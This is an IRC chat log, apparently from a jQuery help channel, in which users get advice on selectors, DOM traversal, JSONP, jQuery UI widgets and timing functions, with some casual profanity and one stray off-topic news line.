[10:25:41] <m0dmd> I'm not worry about validated code at this point.
[10:26:00] <m0dmd> Since rebuilding is inevitable.
[10:26:24] <m0dmd> wkmanire it's all good man, I'm going to stick with disabling the async for that call.
[10:26:31] <m0dmd> As it's working successfully.
[10:26:31] <gnarf> jeffsmykil: http://jsfiddle.net/gnarf/FVLJJ/19/
[10:26:36] <gnarf> yes you would
[10:26:39] <wkmanire> okeydokey
[10:26:50] <m0dmd> But I'm going to make it so that you do the date picking from the editor instead.
[10:26:56] <Klevre> I have a link inside an li element which has a click event bound. How do I allow clicking on the link without triggering the li's click event?
[10:27:00] <wkmanire> I`m going to log for a little while folks. Later.
[10:27:01] <m0dmd> Can't right now because the editor needs to be used.
[10:27:06] <m0dmd> lata wkmanire
[10:27:07] <Klevre> I tried event.stopPropagation();
[10:27:09] <wkmanire> m0dmd: I see.  good luck
[10:27:30] <gnarf> jeffsmykil: http://jsfiddle.net/gnarf/KrFby/
[10:27:46] <ccmonster> any multi level menu plugins or anything you guys suggest?
[10:27:47] <jeffsmykil> so no space after class but yes after id
[10:27:50] <jeffsmykil> didnt know that
[10:27:53] <jeffsmykil> thanks gnarf
[10:28:06] <gnarf> jeffsmykil: space whenever you want to select children
[10:28:13] <jeffsmykil> oh
[10:28:15] <jeffsmykil> huh
[10:28:17] <gnarf> jeffsmykil: > whenever you want to select DIRECT children
[10:28:32] <gnarf> like "#id.class" finds something with that id and that class
[10:28:38] <jeffsmykil> man ive been doing this wrong a while
[10:29:23] <gnarf> ?decedent selector
[10:29:39] <jeffsmykil> thanks

[10:30:00] <couchhero> Hi has anyone tried to use couchdb with jquery mobile?
[10:30:09] <couchhero> anyone here I mean
[10:33:18] <jeffsmykil> gnarf how do i count down the dom then?
[10:33:26] <gnarf> jeffsmykil: ?
[10:33:35] <jeffsmykil> the fourth element after foo
[10:33:48] <gnarf> #foo +++
[10:33:57] <gnarf> +
[10:34:06] <m0dmd> bb
[10:34:37] <jeffsmykil> gnarf what is that called
[10:35:03] <gnarf> jeffsmykil: http://jsfiddle.net/gnarf/cCtDK/
[10:35:19] <gnarf> jeffsmykil: http://api.jquery.com/category/selectors/hierarchy-selectors/ "next adjacent selector"
[10:35:28] <jeffsmykil> ty
[10:35:28] <gnarf> +*+*+*+* would match 4 elements after something
[10:36:11] <gnarf> and +*+*+*~* would match 4 elements after and all the rest
[10:36:53] <jeffsmykil> var test = $("#" + whichWidget + "+ * + * + * + *" ).attr('class');
[10:37:01] <jeffsmykil> giving me undefined
[10:37:13] <gnarf> prolly cuz it didn't match an element
[10:37:36] <gnarf> put the html into a fiddle
[10:37:42] <gnarf> try decorating it with css
[10:39:12] <mightym> is it possible that its not allowed to do a jquery post request crossdomain?
[10:39:56] <gnarf> mightym: it isn't just possible, its truth
[10:40:20] <mightym> gnarf: thx a lot, finally ;)
[10:40:21] <gnarf> you can't make a request to any page using ajax that is not in the EXACT same domain, port, protocol
[10:40:58] <mightym> but from my lokal machine it works to another domain ... that was what confused me
[10:41:02] <gnarf> you can look into using JSONP
[10:41:14] <gnarf> mightym: never develop using "local machine" - always use a server
[10:41:54] <gnarf> even if that server is a virtual machine running apache - you'll have your code much more accurately represented
[10:42:00] <gnarf> things behave strange in file:/// urls
[10:42:28] <JAAulde> Does anyone know if UI Tooltip can support delegation of the mouse enter/leave events? I have a celandar with lots of events on it, and it is updated via ajax. I want the mouseover of each event to show some stuff in a tooltip, but don't want to have to call tooltip on them all individually, or maintain it as ajax updates
[10:43:13] <JAAulde> this is using Adam Shaw's full calendar if it makes any difference
[10:43:41] <jeffsmykil> gnarf with the * it has to be the same element type?
[10:43:50] <gnarf> jeffsmykil: * matches anything
[10:44:50] <jeffsmykil> gnarf:  http://jsfiddle.net/cCtDK/3/
[10:45:22] <gnarf> jeffsmykil: nothing matches that selector
[10:45:23] <jeffsmykil> has to be a child
[10:45:28] <gnarf> it doesn't share a parent
[10:45:34] <jeffsmykil> didnt know that
[10:45:36] <jeffsmykil> k
[10:45:52] <gnarf> its only "next" element in the same parent selected by +
[10:46:22] <Reddog[0]> Hi folks, got a quick question for any users / devs of jqm 1.0a4.1 if anyone can help.  Seems our upgrade to a4.1 has broken radio buttons - given a set of them I can click one, but clicking the other does not change the highlighted button as it used to
[10:46:22] <gnarf> jeffsmykil: all this seems a really f'ed up way to select elements though
[10:46:30] <jeffsmykil> indeed
[10:46:41] <jeffsmykil> i need to rethink this
[10:46:42] <Reddog[0]> I realizet here's several issues people are working on, but I wonder if there's anybody with a quick workaround that could help me for now
[10:47:50] <jsvana> How do I change the content of a specific element from an asyncronous function?
[10:47:59] <jeffsmykil> gnarf i figuring out where someone clicked and then checking if something inside of it is hidden
[10:48:43] <gnarf> jeffsmykil: "something" ?
[10:48:56] <jeffsmykil> an element
[10:49:00] <gnarf> in jQuery: $(this).find(":hidden") should get you any elements that are hidden
[10:49:37] <jeffsmykil> that finds all hidden elements though
[10:49:41] <gnarf> right
[10:49:47] <gnarf> only inside of "this"
[10:49:50] <jeffsmykil> i can then compare?
[10:49:53] <jsvana> For example, say I had a few elements of class "foo" and had one selected in context by a click event, and then a post was called.  How would I change the specific "foo" element?
[10:49:57] <jeffsmykil> ok let me play with that
[10:50:01] <gnarf> .find() is kinda like a decendant selector
[10:50:08] <gnarf> only looks for stuff underneath this
[10:50:51] <jeffsmykil> what if there is more than one thing hidden underneath it
[10:51:04] <gnarf> jeffsmykil: what do you want to find?
[10:51:11] <gnarf> jeffsmykil: the first hidden thing?
[10:51:20] <jeffsmykil> yeah
[10:51:26] <gnarf> .find(":hidden").first()
[10:51:48] <gnarf> or like just give the hidden thing a class and make your life easier
[10:51:56] <phlp> jsvana: cache it inside the click.. $foo = $(this); then inside the post callback you can use $foo
[10:51:58] <jeffsmykil> it does have a class
[10:52:09] <gnarf> .find(".hideme").toggleClass("hideme")
[10:52:15] <gnarf> jeffsmykil: give it one
[10:52:35] <gnarf> stumbling around the DOM is never smart
[10:52:43] <gnarf> its best to know exactly what you want to find
[10:52:49] <jeffsmykil> i never claimed to be smart ;)
[10:53:03] <jsvana> phlp: Thanks
[10:57:28] <jeffsmykil> gnarf:  if($(whichWidget).find("menuContainer").is('hidden'))
[10:57:31] <jeffsmykil> can i do that?
[10:58:02] <gnarf> jeffsmykil: well, things are strange there
[10:58:17] <gnarf> you are totally missing like "." or "#" or ":"
[10:58:23] <gnarf> on like all of those things
[10:58:33] <gnarf> what is "whichWidget"
[10:58:40] <jeffsmykil> yeah i fixed that
[10:58:50] <jeffsmykil> var whichWidget = $(this).parent().parent().parent().attr('id');
[10:58:56] <gnarf> jeffsmykil: why???
[10:59:02] <jeffsmykil> if($("#" + whichWidget).find("menuContainer").is('hidden'))
[10:59:13] <systemfault> Eww
[10:59:15] <gnarf> jeffsmykil: does whichWidget have a "class" ?
[10:59:26] <gnarf> like class="widget" ?
[10:59:37] <gnarf> var widget = $(this).closest(".widget");
[10:59:39] <systemfault> Perhaps .closest with a proper selector would be better than parent().
[10:59:42] <systemfault> gnarf++
[10:59:53] <gnarf> var container = widget.find(".menuContainer");
[11:00:04] <gnarf> if (container.is(":hidden")) continer.show("slow");
[11:00:07] <jeffsmykil> my head is spinning
[11:00:25] <gnarf> jeffsmykil: stop turning in your chair
[11:00:44] <gnarf> http://api.jquery.com/closest
[11:00:51] <gnarf> a) don't get the frickin ID
[11:00:53] <gnarf> you don't need it
[11:00:59] <gnarf> if you store the actual widget
[11:01:06] <gnarf> you wont need to search the dom for it again
[11:01:09] <gnarf> which is always a bonus
[11:01:28] <gnarf> b) don't use .parent().parent().parent()
[11:01:39] <gnarf> use .closest(selector) to find your thing
[11:01:56] <gnarf> then .find your "container"
[11:02:31] <jeffsmykil> var whichWidget = $(this).closest(".widget").attr('id');
[11:02:37] <gnarf> var widget = $(this).closest('.widget'), container = widget.find(".menuContainer");  if (container.is(":hidden")) { container.show("slow"); }
[11:02:43] <gnarf> jeffsmykil: why are you getting its id?
[11:02:51] <jeffsmykil> because its unique
[11:02:57] <jeffsmykil> and there are four of them on a page
[11:03:02] <gnarf> so? who gives a fuck
[11:03:06] <gnarf> do you need the ID for anything?
[11:03:14] <gnarf> if you have the widget
[11:03:18] <gnarf> you can just use the widget
[11:03:20] <jeffsmykil> i was using it to put stuff in
[11:03:31] <jeffsmykil> i guess closest would work
[11:03:39] <gnarf> var widget = $(this).closest('.widget'), container = widget.find(".menuContainer");  if (container.is(":hidden")) { container.show("slow"); }
[11:03:45] <gnarf> does that code make sense?
[11:04:16] <phlp> gnarf can you make me a sandwhich?
[11:04:20] <jeffsmykil> yes i just need to think through it and play through it
[11:04:53] <jeffsmykil> phlp:  i know i seem helpless and that hes doing it all
[11:05:01] <jeffsmykil> im really trying to learn though
[11:05:47] <gnarf> phlp: nope - and you aren't in my sudoers file
[11:06:00] <phlp> :)
[11:06:06] <mattp_> if i want to wrap an event handler in a method modifier, ie button.click(function() { if (arbitrary) { do_something(); } }
[11:06:20] <mattp_> is it possible to have do_something have 'this' be in the context of the click event handler?
[11:06:25] <gnarf> mattp_: yes
[11:06:31] <gnarf> mattp_: do_something.call(this)
[11:06:38] <gnarf> google mdc call
[11:06:44] <mattp_> gnarf: thanks :)
[11:06:55] <gnarf> mattp_: .call() and .apply() are methods on ALL functions
[11:07:17] <gnarf> .call( context, arg1, arg2, arg3) and .apply( context, [arg1, arg2, arg3])
[11:07:49] <mattp_> ahh
[11:07:54] <lenswipe> hey guys
[11:07:59] <jeffsmykil> gnarf what does something like var whichWidget = $(this).closest(".widget");
[11:08:02] <jeffsmykil> actually return?
[11:08:13] <lenswipe> i need a certain version of jquery for a framework im using, but that version of jquery doesnt support my ajax calls
[11:08:20] <gnarf> jeffsmykil: a jQuery object containing the closest match for ".widget" from this
[11:08:26] <lenswipe> is it possible to use multiple jquery versions?
[11:08:39] <mattp_> gnarf: how come apply is wrapped in an array while call is not?
[11:08:46] <gnarf> lenswipe: yes, but its gonna cause headaches
[11:08:50] <lenswipe> how?
[11:09:01] <lenswipe> how do i include multiple versions of jquery?
[11:09:07] <gnarf> lenswipe: http://api.jquery.com/jQuery.noConflict
[11:09:20] <jeffsmykil> gnarf: http://pastebin.com/MWPWr8CS
[11:09:34] <gnarf> include first version, var oldjQuery = jQuery.noConflict(); then include the second
[11:09:38] <gnarf> but its ugly
[11:09:38] <brenosalgado> can someone help me on how to set datatables to use sorting with dd/mm/yyyy? datatables.net shows some codes for this purpose, but it doesnt say exactly where/how to put the fucking code, so Im lost here...
[11:10:02] <gnarf> jeffsmykil: you don't need the () around the widget, its already a jquery object
[11:10:18] <gnarf> jeffsmykil: and you don't need selector again
[11:10:24] <gnarf> on line 5
[11:10:35] <jeffsmykil> could I do $(whichWidget)
[11:10:37] <gnarf> lemme repeat for the third time
[11:10:38] <gnarf> var widget = $(this).closest('.widget'), container = widget.find(".menuContainer");  if (container.is(":hidden")) { container.show("slow"); }
[11:10:39] <jeffsmykil> and it would still work?
[11:10:45] <gnarf> jeffsmykil: yes, you could, but its f'n stupid
[11:10:49] <gnarf> its a wasted function call
[11:11:01] <jeffsmykil> wtf
[11:11:08] <jeffsmykil> im getting unrecognized expression
[11:11:13] <gnarf> jeffsmykil: it
[11:11:22] <gnarf> jeffsmykil: its kinda like $( $( ".something" ) )
[11:11:25] <gnarf> why would you do that?
[11:11:34] <jeffsmykil> because im a noob
[11:11:43] <gnarf> i'm telling you, don't
[11:11:45] <gnarf> listen
[11:11:48] <jeffsmykil> yeah im not now
[11:11:55] <jeffsmykil> once you told me i stopped
[11:11:57] <gnarf> and actually read that line of code i pasted :)
[11:12:16] <gnarf> like character for character
[11:12:24] <Itrace> I'm using JSON to get two different API's (one is from UStream.com and the other is Twitter). I'm calling them both on the same page, but the second one always fails. Do I need to do something different?
[11:12:32] <jeffsmykil> k
[11:12:46] <gnarf> Itrace: paste code on jsfiddle.net ?
[11:12:58] <Itrace> One sec...
[11:13:02] <gnarf> Itrace: are you using jsonp?
[11:13:10] <jeffsmykil> gnarf is the , a line break?
[11:13:10] <Itrace> no
[11:13:21] <gnarf> Itrace: you can't do cross domain without jsonp
[11:13:31] <gnarf> jeffsmykil: no, its a comma
[11:13:36] <gnarf> var a=1, b=2, c=3;
[11:13:41] <jeffsmykil> you dont have to put var twice
[11:13:43] <jeffsmykil> didnt know that
[11:13:56] <gnarf> jeffsmykil: if you use commas, you can define multiple in one var statement
[11:14:12] <Itrace> gnarg: umm... OK. I always thought JSONP had different syntax. Yes I am using JSONP
[11:14:52] <gnarf> Itrace: is the server responding with jsonp ?
[11:15:10] <gnarf> like - look at the response in firebug / webkit inspector
[11:15:58] <Itrace> gnarf: let me back up. Both API calls work independantly. It's only when I include both on the same page that the second one fails.
[11:16:21] <Itrace> Respones says, Aborted.
[11:16:25] <gnarf> Itrace: still waiting to see code to maybe see why
[11:16:30] <Dr4g_> how to clone a DOM element ?
[11:16:34] <Itrace> ...sec
[11:16:41] <Dr4g_> just .clone() ?
[11:16:43] <gnarf> Dr4g_: http://api.jquery.com/clone
[11:19:54] <Reddog[0]> So does anyone see anything immediately wrong with this, or know of a workaround?  http://jsfiddle.net/jdAHj/
[11:20:42] <Reddog[0]> The radio will select one time, and after that appears to be broken (at least visually)
[11:20:55] <serio> gf3: are you able to lease IP's from your phone?
[11:21:12] <serio> I would assume you can...
[11:21:23] <gf3> serio: from where/who?
[11:21:44] <serio> like, lease an ip to your laptop so you can surf over 3G or whatever.
[11:21:58] <gnarf> Reddog[0]: have you by chance tried in #jquerymobile ?
[11:22:11] <gnarf> Reddog[0]: wish i knew more about mobile
[11:22:32] <Reddog[0]> gnarf: It's nice, just has a few quirks.  I didn't realize the other channel existed, I'll try there.  Thank you
[11:22:48] <gnarf> Reddog[0]: np, hope you find your solution ;)
[11:22:52] <jeffsmykil> gnarf learned a ton ty
[11:25:58] <gnarf> jeffsmykil: np
[11:26:01] <b1lly> if I wanted to select the last <li> element within a <ul> how do i do that with jquery
[11:26:34] <jovrtn> $('ul li:last');
[11:26:54] <gnarf> b1lly: do you have the ul?
[11:27:14] <gnarf> ul.find("li").eq(-1) is prolly the "fastest"
[11:27:24] <gnarf> ul.find("li").last()
[11:27:37] <gnarf> if you look at the source, .last() returns .eq(-1)
[11:27:51] <b1lly> what does eq stand for
[11:28:00] <gnarf> b1lly: http://api.jquery.com/eq
[11:28:38] <jovrtn> are :last and .last() speed equivalent?
[11:28:56] <gnarf> jovrtn: not at all
[11:29:05] <jovrtn> doh
[11:29:09] <b1lly> so $("ul.find('li').last()")click(function() { }); ?
[11:29:20] <jovrtn> guess I need to crack open the source more often
[11:29:24] <gnarf> ul.find('li').last().click(function() {});
[11:29:28] <gnarf> jovrtn: that one is harder
[11:29:43] <gnarf> jovrtn: any of the jQuery "meta" selectors (the :selector) that aren't present in CSS
[11:29:50] <b1lly> gnarf what if i wanted it for the specific selector #blah
[11:30:00] <b1lly> find ("#blah li").last ?
[11:30:02] <gnarf> $("#blah li").last()
[11:30:11] <gnarf> $("#blah li").last().click()
[11:30:24] <jovrtn> is :last-child leveraged at all?
[11:30:41] <ajpiano> jovrtn: ??
[11:30:44] <gnarf> jovrtn: that is actually a css selector... so $("#blah li:last-child") can use css
[11:31:04] <ajpiano> jovrtn: are you by any chance who i think you are
[11:31:22] <jovrtn> ajpiano: probably not :P
[11:31:30] <jovrtn> I guess I assumed :last was using :last-child somehow
[11:31:30] <ajpiano> aw ok :(
[11:31:43] <balgarath> I've got a form in a modal I am submitting via ajax.  submission works great the first time, but if it needs to be filled out again, my submit callback never fires, you click the submit and nothing happens at all - http://pastie.org/1897713 - any idea what could be wrong?
[11:31:44] <gnarf> jovrtn: anyway, i stopped mid explain earlier - sorry --- if there is a : selector that isn't supported by CSS - jQuery (sizzle) has to actually parse the selector itself as opposed to letting .querySelectorAll() do the issues
[11:32:40] <gnarf> jovrtn: so using any of the "jQuery selectors" when using find or $() is 9 times out of 10 going to be faster if you avoid using the jQuery selectors, and instead apply them as a .filter()
[11:32:51] <b1lly> perfect
[11:32:57] <gnarf> i.e. $("ul:hidden") is slower than $("ul").filter(":hidden")
[11:33:30] <jovrtn> o hmm
[11:33:56] <jovrtn> I hadn't considered filter()
[11:34:40] <gnarf> jovrtn: but, as with anything performance related, it varies browser to browser, and version to version --- always jsperf if you're concerned
[11:35:57] <systemfault> The futureproof way is to use the most CSS possible, no?
[11:36:11] <systemfault> last-child in the preceding example
[11:36:34] <systemfault> As if the browser supports it.. it will just be passed to querySelectorAll
[11:37:12] <gnarf> systemfault: right
[11:37:19] <trevatwork> anyone have a good solution for when you're being asked to have "normal" colors in a few jQuery icons -- eg a yellow pencil, a red circle-minus, a green circle-plus, etc?
[11:37:31] <b1lly> im trying to "sleep" or pause the execution of the rest of the script for about 2 seconds, is there a pre-built in sleep function?
[11:37:51] <systemfault> b1lly: No, JS is asynchronous by nature.
[11:37:55] <gnarf> b1lly: no - but you can setTimeout()
[11:38:24] <jovrtn> what about http://api.jquery.com/delay
[11:38:26] <gnarf> setTimeout(function(){ console.log("two seconds later") }, 2000);
[11:38:27] <Itrace> gnarf: sorry to bother you, and thanks for your help. It looks like my error was caused because Twitter is down. Thanks
[11:38:28] <gnarf> https://developer.mozilla.org/en/window.setTimeout
[11:38:43] <gnarf> jovrtn: wrapper for setTimeout, only really used for animation/queue functinos
[11:39:20] <jqp> is there a way to access the onreadystatechange event via jquery's $.ajax() method?
[11:39:59] <gnarf> jqp: why?
[11:40:42] <jqp> i want to implement xhr streaming, which requires detecting the onreadystatechange event in an XmlHttpRequest object
[11:40:46] <vacho> jQuery("#phone-textInput").autocomplete is not a function
[11:40:49] <vacho> why am I geting that????
[11:40:51] <vacho> I have jquery UI
[11:41:19] <jqp> (i want to implement xhr streaming in jquery)
[11:42:22] <gnarf> jqp: you might be able to build a custom transport
[11:42:29] <gnarf> http://api.jquery.com/extending-ajax
[11:42:42] <michaelt1> vacho are you trying to call autocomplete before $.fn is extended by the plugin?
[11:42:51] <vacho> no
[11:42:51] <vacho> after
[11:43:18] <gnarf> jqp: but I'm pretty sure most of .ajax() is expecting a single response only
[11:43:49] <alus> what do people recommend for overlays? Boxy? jQuery Tools? qTip?
[11:44:04] <jqp> gnarf: that's my impression, that .ajax() is only expecting traditional, full http responses
[11:44:14] <jqp> per "No onreadystatechange mechanism is provided, however, since success, error, complete and statusCode cover all conceivable requirements.", at http://api.jquery.com/jQuery.ajax/
[11:44:16] <michaelt1> vacho, put in a break point right before you call autocomplete
[11:44:17] <vacho> Michael, twhat else can it be
[11:44:24] <vacho> how do I put a break point?
[11:44:31] <michaelt1> debugger;
[11:44:36] <gnarf> jqp: right
[11:44:39] <jeffsmykil> gnarf whats the best jquery book for me to get?
[11:44:43] <vacho> Michael, even if i don't xcall it.. im getting stupid errors
[11:44:45] <michaelt1> or through your browser's inspector
[11:44:48] <gnarf> jeffsmykil: *shrug* i don't read
[11:44:55] <jqp> gnarf: wouldn't you say that that statement from the docs is misleading?
[11:44:57] <vacho> c.offset is undefined
[11:44:57] <vacho> [Break On This Error] a.collisionPosition.left<0?g+e+h:d>0?g...style.position="relative";var d=c(b),
[11:45:10] <michaelt1> yeah, vacho, i'd have to see the code
[11:45:16] <gnarf> jqp: you're the first person I've seen ask about it ;)
[11:45:29] <gnarf> jqp: and that doc has been there for a while
[11:45:38] <phlp> jeffsmykil: http://jqfundamentals.com
[11:45:55] <jeffsmykil> this is an ebook?
[11:46:10] <jqp> think adding a mechanism to support detection of the onreadystatechange event in $.ajax() would be a reasonable feature request?
[11:46:17] <jeffsmykil> phlp: ty
[11:46:25] <jeffsmykil> phlp: no dead tree version?
[11:47:42] <phlp> jeffsmykil: i dont have any to recommed. better: http://jqfundamentals.com/book/index.html
[11:48:01] <jeffsmykil> yeah thats formatted more nicely ty
[11:49:25] <Michael> vacho, ?
[12:02:26] <amh345> phlp: member:amh345: http://jsfiddle.net/M63vU/1/ your lists were nested wrong  <<  i see that it's working.  the thing is though now the item product name:cat one a a prod isn't a sub cat of product name:cat one a prod.
[12:03:03] <CasW> I have a draggable + resizable div, but why doesn't 'containment: "window"' work properly, if I set it, you can't resize it at all :(
[12:03:31] <gnarf> CasW: "window" is not a selector
[12:03:34] <gnarf> try "body" ?
[12:03:47] <CasW> It is in draggable
[12:03:58] <gnarf> containment: window ?
[12:04:12] <CasW> And "body" is always the height of the html (so not the height of the window)
[12:04:27] <CasW> And in draggable, I used the "'s, and it worked fine
[12:04:32] <vacho> can someone please link me a CDN link to jquery UI
[12:04:32] <CasW> Wait a minute, I'll test it
[12:04:51] <gnarf> CasW: hrm
[12:05:25] <CasW> Yes, none of them worked
[12:05:58] <gnarf> CasW: digging in the code
[12:06:07] <phlp> amh345: http://jsfiddle.net/M63vU/2/
[12:06:20] <CasW> gnarf: what do you mean?
[12:06:34] <ajpiano> vacho http://ajax.googleapis.com/ajax/libs/jqueryui/1.8.12/jquery-ui.js
[12:06:54] <amh345> phlp: ah. i see. thank you.
[12:07:02] <gnarf> CasW: resizable and draggable use different logic
[12:07:03] <vacho> jQuery("input#autocomplete").autocomplete is not a function
[12:07:06] <gnarf> for the containment option
[12:07:17] <gnarf> CasW: "window" isn't supported in resizable
[12:07:36] <vacho> ajpiano, how is this remotely possible : http://pastebin.com/37tb2JY0
[12:07:57] <ajpiano> i don't know
[12:07:57] <CasW> Oh, so what I want isn't possible?
[12:08:04] <vacho> ajpiano, how can that not work..seriously
[12:08:09] <ajpiano> make a fiddle bra
[12:08:24] <gnarf> CasW: maybe...
[12:08:53] <gnarf> ajpiano: do you remember seeing an ui bugs about resizable containment vs draggable containment ?
[12:09:13] <ajpiano> i don't but i am not really that encyclopaedic ont hat subject matter
[12:09:41] <gnarf> k
[12:09:46] <gnarf> my searches have found nothing
[12:10:01] <gnarf> CasW: I'm gonna submit a ticket for it
[12:10:07] <CasW> Thanks!
[12:10:19] <gnarf> CasW: it would make sense if draggable can support containment: "window" that resizable should too
[12:10:22] <gnarf> its incosistent
[12:10:57] <CasW> Yeah, I'll check what happens if i remove the draggable
[12:11:18] <CasW> Nope, doesn't work, either
[12:11:40] <b1lly> is there a way to count the first 5 elements heights? adding them up
[12:11:55] <gnarf> CasW: the code for resizable just passes whatever you give it as a selector if its a string
[12:12:09] <gnarf> whereas draggable does a bunch of special stuff if the option is "window"
[12:12:30] <juha___> what is the html character for ¢ (us cent)
[12:12:33] <CasW> Oh, alright, and I suppose I can't use that code of draggable?
[12:12:44] <gnarf> CasW: http://bugs.jqueryui.com/ticket/7369 feel free to follow it
[12:13:11] <gnarf> CasW: not unless you wanna hack it into resizable and submit a pull request :)
[12:13:44] <CasW> Well, I think I can't, because it is all encrypted (no experience with that :()
[12:13:52] <CasW> Or at least compressed
[12:14:29] <juha___> &cent;
[12:15:02] <b1lly> is there a way to break out of a .each() ?
[12:15:22] <erichynds> return false, b1lly
[12:15:28] <CasW> Ah, wait, on github.com/jquery is the sourcecode :D
[12:15:55] <b1lly> so i can do $("blah").each(function() { count++; if (count > 1) return false; });
[12:16:03] <gnarf> CasW: https://github.com/jquery/jquery-ui
[12:16:08] <gnarf> fork it
[12:16:11] <CasW> Yeah, I just found it
[12:16:12] <gnarf> :)
[12:17:10] <CasW> I should learn more JavaScript; I suppose cancel: function() is the same as function cancel()?
[12:17:40] <draginx> casw: I believe if it's in an "object" then yes O_o
[12:17:57] <CasW> Ah, alright, thank you :)
[12:17:58] <draginx> cancel = function() {} is doable I believe
[12:18:12] <draginx> not 100% sure on that though so yer hopefully someone can correct me :)
[12:18:22] <draginx> NodeJS is an excellent way of learning how to javascript properly
[12:19:56] <balgarath> just started bigging into node.js, fun stuff :)
[12:19:59] <Noble> So I've found a neat script that I want to use in my web-page. And it works if I try the included example.html in my web-browser. HOWEVER, if I copy/paste the <script>..</script> into my own header, and adds the needed ids to the elements I want nothing happens. Please advice.
[12:20:22] <erichynds> ?tias @ b1lly
[12:21:06] <vacho> damn jquery UI
[12:23:42] <CasW> It looks like it's the same in both packages...
[12:23:57] <CasW> But you should also be able to use 'document', so let's try it
[12:24:25] <CasW> Et voila! When using 'document', it worked!
[12:25:02] <phlp> https://github.com/jquery/jquery-ui/blob/master/ui/jquery.ui.resizable.js#L663
[12:25:14] <jovrtn> b1lly: not sure if this is the fastest way, but it works: var total = 0; $('#list').find(':lt(5)').each(function(i) { total = total + $(this).height(); });
[12:25:30] <Noble> So, <script></script> is supposed to go in the html header, right?
[12:26:10] <gnarf> b1lly: what are you trying to do?
[12:27:55] <CasW> Thank you, guys!
[12:33:57] <no5thdimension> how do you declare global variables from within a function?
[12:34:31] <gnarf> no5thdimension: ewww did you just say global?
[12:34:32] <wafflesburger> why would you do that
[12:34:57] <gnarf> no5thdimension: if you REALLY want to... window.variableName --- "window" is the global scope object in javascript
[12:35:05] <draginx> lol
[12:37:48] <wafflesburger> the day javascript programmer snivels about programming practices is the day that ... something
[12:38:07] <wafflesburger> :P
[12:39:09] <TonkaTruck> Has anyone here messed with spine.js?  I'm curious about it's router.
[12:39:18] <TonkaTruck> its router i mean oops
[12:44:58] <RobW> attempt to run compile-and-go script on a cleared scope jquery-1.6.1.min.js Line 18
[12:45:06] <RobW> firebug spits that out wuuuuuuut?
[12:49:57] <Prot> A stash of pornography was found among the trove of evidence seized from Osama bin Laden's Abbottabad compound by US Navy SEALs, according to a report confirmed by ABC News
[12:50:12] <Prot> yeah... wrong window sorry
[12:50:48] <herrgabriel> Hi everyone. I have a major problem with my serialScroll plugin.
[12:50:59] <TonkaTruck> Silly terrorists looking at porn.
[12:51:16] <systemfault> ...
[12:51:31] <systemfault> Bin Laden is a POS but I'd be surprised.
[12:51:41] <ccmonster> hey guys, im having trouble quickly traversing this json
[12:51:42] <herrgabriel> It prevents my anchor links to work.
[12:51:45] <ccmonster> in a fairly automated way
[12:52:02] <ccmonster> how do i output my json as a string?
[12:52:11] <systemfault> ccmonster: JSON is a string.
[12:52:19] <systemfault> JSON is a serialization format.
[12:52:28] <ccmonster> yes, when i console it out it shows as a JSON obj
[12:52:39] <systemfault> No such thing as a JSON object.
[12:52:42] <systemfault> It's JS.
[12:53:02] <systemfault> So.. you have a JS object and want to write a JSON string with it?
[12:53:13] <aciar> can anyone tell me why this button icon is so large compared to the ones shown in the docs? http://132.235.9.20/input/form.php (the minus button im working on)
[12:53:20] <ccmonster> yea.
[12:53:41] <TonkaTruck> Once you parse a json string you have an object derived from that json though right?
[12:53:46] <TonkaTruck> heh
[12:53:49] <ccmonster> in firebug it keeps logging as the obj format, i just want the whole string.
[12:53:50] <alexparker> anyone really familiar with delegate?
[12:54:27] <TonkaTruck> ccmonster: then you'll need to log the json string rather than the object from which it derived.
[12:54:44] <systemfault> ccmonster: I know JQuery has parseJSON.. but I don't know if it has a "stringify"
[12:54:55] <herrgabriel> anyone?
[12:55:05] <ccmonster> ok, well i have a xml obj, and i used xml2json to convert to json.
[12:55:19] <ccmonster> not sure if that's a good route to go...rather than use reg xml
[12:55:21] <nanicoar> Hello.
[12:55:39] <ccmonster> bug now i want to build out a nav from the xml /json structure
[12:56:41] <CasW> I want to load a div from a textfile (so 'draggable.txt', for example)
[12:56:59] <CasW> So I doe $("body").load("/draggable.txt");
[12:57:00] <CasW> right?
[12:57:02] <CasW> *do
[12:58:06] <phlp> ccmonster: you can use JSON.stringify({key: 'val'}) but if you need older than ie8 https://github.com/douglascrockford/JSON-js/blob/master/json2.js
[12:58:55] <ccmonster> have you ever used xml2json, or have a preferred method of handling xml
[12:58:55] <ccmonster> ?
[12:59:06] <herrgabriel> guys, I need help! the serialScroll plugin is being a bitch to my anchor links :(
[13:01:11] <phlp> ccmonster: $(xml) will parse the xml
[13:01:32] <RobW> how do I fade in to block instead of inline?
[13:01:33] <ccmonster> $(xml)?
[13:02:01] <ccmonster> $(element).css('display','block').fadeIn('fast');
[13:02:06] <phlp> jQuery(xmlData).find('xmlnode');
[13:02:22] <ccmonster> so you think that's better than xml2json then handling it?
[13:04:27] <CasW> If I want to load text from the server without having to refresh and put it in body, I use $('body').load("/textfile.txt");, right?
[13:05:07] <RobW> ccmonster: thanks but went with opacity animation instead
[13:05:11] <diegocn> hello ppl
[13:05:22] <diegocn> i'm using jquery ui dialog
[13:06:20] <diegocn> when i close.. how can I do hide: slide down
[13:06:36] <diegocn> it only slide to left-top
[13:06:43] <diegocn> i want right-bottom
[13:08:35] <herrgabriel> this channel sucks major ass :(
[13:08:48] <erichynds> mlu
[13:09:10] <sero|work> lol
[13:09:21] <sero|work> waaah you didnt fix my problem /quit
[13:09:45] <jqp> can i access the data in a response with an ajax deferred callback?
[13:09:58] <alaing> JQUERY UI - I using the tabs widget. I want to submit the page when the user clicks a tab and then open the tab on the last clicked tab before the page was submitted. how do i do this
[13:10:17] <jqp> e.g. $.ajax({url: "foo"}).complete(function(data){alert("response data: " + data);});?
[13:10:18] <alaing> I managed to submit it but it keeps going back to the first one
[13:10:51] <alaing> i have also been able to pick out the index of the clicked menu
[13:10:53] <jovrtn> alaing: you want the user to submit the form, not the page
[13:11:21] <alaing> jovrtn: sorry i meant the form
[13:11:42] <jovrtn> alaing: capture the form submit event with $('form').submit(), use preventDefault() to stop it from submitting the page, and submit the form via .ajax()
[13:11:58] <jovrtn> in the ajax callback you can then load the correct tab
[13:12:22] <alaing> jovrtn: unfortunately not that easy
[13:12:49] <jovrtn> o?
[13:12:55] <alaing> i'm using oracle application express
[13:13:08] <jovrtn> ah
[13:13:15] <alaing> and it has its own ajax api
[13:13:19] <alaing> veyr annoying
[13:13:26] <jovrtn> if the page has to reload, you can send a get variable
[13:13:31] <alaing> but thats what i have to work with
[13:13:34] <jovrtn> which you could then read and select the appropriate tab
[13:13:37] <jovrtn> or just a hash or something
